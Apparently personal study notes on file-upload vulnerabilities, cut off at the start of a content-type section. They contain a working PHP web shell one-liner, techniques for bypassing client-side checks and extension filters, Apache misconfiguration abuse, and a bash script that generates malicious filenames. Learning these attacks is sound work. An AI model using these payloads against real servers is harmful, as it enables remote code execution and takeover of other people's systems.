Uploading user files is now a key feature of web apps, upload profile images, pdfs, videos.
Common vulnerability with high impact rating, usually due to RCE and web shells
### Types of Upload Attack 
Most common vulnerability is weak file validation/verification.
 
May only be able to upload specific file type which will allow us to preform exploit if certain security protections are missing.
#### Attack Examples
- Introducing other vulnerabilities
- Causing Denial-of-Service on the back-end server.
- Overwriting critical system files
Out of date libraries may be vulnerable to these sorts of attacks.

## Absent Validation
Most basic type when no validation on files. allows upload of any file type by default 
With these apps we can directly upload our web shell and then just visit the uploaded script.
### Arbitrary File Upload
No restrictions on back end we can upload arbitrary files to back end to gain complete control over it. 
####  Identifying Web Framework
To upload malicious script we need to figure out what framework and file extensions the server is compatible with. 

To figure this out we fuzz with a web extension wordlist or can use wappalyzer 
fuzzing is more accurate.

we must then upload a web shell in the same programming language
#### Vulnerability Identification
Once we have detected the framework we can then test whether we can upload a file with the same extension. 
### Upload Exploitation
##### WebShells
Allow execution of cmd commands from web page.
Some included with kali or SecLists
[phpbash](https://github.com/Arrexel/phpbash) is nice too.
###### Basic PHP Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```

Web shells are not exclusive to php and exist with other frameworks, with .NET we can pass the `eval()` function 

Web shells may not work in some cases as system() or other such commands may be blocked by WAF. In these cases we may need to use advanced techniques to bypass their security mitigation.
##### Reverse Shells
Reverse shells call a bash session back to our computer
Included with kali

## Client-Side Validation
Many web apps only rely on front-end JavaScript code to validate selected file format

__To check attempt to upload a file with a wrong file extension and if is blocked in web browser and no http request is sent then its client-side (There may be server-side also)__

Two potential bypasses: 
	_Modify upload request to back-end server_
	_Manipulate front-end code to disable validations_

### Back-End Request Modification
#BurpSuite
>Capture Upload with burpsuite

Two important part of the request is `filename=''` and `content`
`Content-Type` plays a key role in content validation

### Disabling Front-end Validation
As front-end validation is being completely processed within our web browser we have complete control over them. Because of this we can modify these scripts or disable them entirely 

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Possible file format validation easily modifiable by removing the `accept=".jpg..."` tag.

more interesting part is `onchange="checkFile(this)"` 
```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```
script checks whether file extension is jpg/png/jpeg then throws an error message and disables the upload button.

Easy bypass is just to remove `onchange="checkfile(this)`

## Blacklist Filters
Backend validation control
### Blacklisting extensions
_Extension not allowed_ response from http request indicates that web app may have some form of file validation on the backend.

2 most common forms of validating extensions on back end
- Testing against a Blacklist of types
- Testing against a Whitelist of types
Validation may also check ***MIME*** value

Weakest form is Blacklist, the following code checks against a blacklist of extensions and determines if request should be blocked. 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```


The code takes file extensions them compares them with list. Comparison is also case sensitive so pHp or PHP or pHP would work.

### Fuzzing Extensions
to start we should fuzz for all possible accepted file extensions
we can use burpsuite intruder to fuzz the filename extension to find if any requests are accepted 

```html
Content-Disposition: form-data; name="uploadFile"; filename="idk.§jpg§"
```

we can now analyse the results from the intruder test and upload a shell from that 

***Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.***

## Whitelist Filters
whitelist utilizes a list of allowed file extensions. Generally more secure than blacklisting

### Whitelisting Extensions
Fuzz for allowed extensions as some *malicious* extensions are still allowed to upload 
Example Whitelist Code:- 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

script uses regex to test wether filename contains allowed extensions.
Issue with this script lies in the regex check.

### Double Extensions
Code only tests for whether a file name contains an image extension. 
An easy way of bypassing this is through the use of ***DOUBLE EXTENSIONS*** (.jpg.php)
only the last extension is valid but the file name still contains the extension.

This may not always work as some web apps may use a strict regex pattern 
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
This pattern only considers the last file extension 
it uses (`^.*\.`) to match everything up to the last (`.`), and then uses (`$`) at the end to only match extensions that end the file name

some exploit techniques my allow us to bypass this pattern but mostly rely on misconfigurations or outdated systems.\

#### Reverse Double Extension
In some cases the file upload functionality may not be vulnerable but web server configuration may be.
Check for open source web application which has upload functionality. 

For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

above config determines which files are allowed to execute php code.
This particular regex pattern does not end the code $. 

our previous shell.php.jpg will pass the whitelist but will be able to execute php code as it has .php in its name. 

#### Character Injection 
We can inject several characters before or after the final extension to cause the webapp to misinterpret the filename and execute the uploaded file as a PHP script

```
    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …
    :
```

Each character has specific use case. 
*%00 (shell.php%00.jpg)* works with php servers with 5.X or earlier as it causes php server to end file name after %00 and store file extension as **shell.php** 

**: (shell.aspx:.jpg)** works on windows servers and would case it to be writtes as **shell.aspx** 

Bash script to generate permutation of file name and jpg and php extensions
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

***REMEMBER TO DISABLE URL ENCODING***

## Type Filters
as we're able to file extensions just blocking these isn't enough to make an app secure. Modern upload services test file content and file content-type

### Content Type 